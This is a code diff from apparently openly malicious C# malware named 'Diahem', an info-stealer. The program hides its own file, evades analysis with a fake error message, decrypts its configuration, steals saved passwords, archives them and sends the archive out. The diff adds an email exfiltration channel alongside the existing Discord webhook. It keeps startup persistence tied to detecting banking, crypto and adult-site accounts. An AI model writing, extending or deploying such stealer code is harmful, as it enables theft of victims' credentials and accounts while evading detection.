@@ -31,8 +31,8 @@ namespace Diahem
             if (!Startup.IsFromStartup())
                 Startup.HideFile();
 
-            // If Discord webhook does not exists => Self destruct.
-            if (Config.Webhook.Contains("---"))
+            // If config not initialized => Self destruct.
+            if (Config.DeliveryType.Contains("---"))
                 SelfDestruct.Melt();
 
             // Start delay
@@ -43,23 +43,34 @@ namespace Diahem
             if (AntiAnalysis.Run())
                 AntiAnalysis.FakeErrorMessage();
 
-
             // Change working directory to appdata
             Directory.SetCurrentDirectory(Paths.InitWorkDir());
 
             // Decrypt config strings
             Config.Init();
 
-            // Test Webhook if valid
-            if (!DiscordWebHook.WebhookIsValid())
-                SelfDestruct.Melt();
+            // Validate delivery method
+            if (Config.DeliveryType == "email")
+            {
+                if (string.IsNullOrWhiteSpace(Config.EmailRecipient))
+                    SelfDestruct.Melt();
+            }
+            else
+            {
+                if (!DiscordWebHook.WebhookIsValid())
+                    SelfDestruct.Melt();
+            }
 
             // Steal passwords
             var passwords = Passwords.Save();
             // Compress directory
             var archive = Filemanager.CreateArchive(passwords);
+            
             // Send archive
-            DiscordWebHook.SendReport(archive);
+            if (Config.DeliveryType == "email")
+                EmailSender.SendReport(archive);
+            else
+                DiscordWebHook.SendReport(archive);
 
             // Install to startup if enabled in config and not installed
             if (Config.Autorun == "1" && (Counter.BankingServices || Counter.CryptoServices || Counter.PornServices))
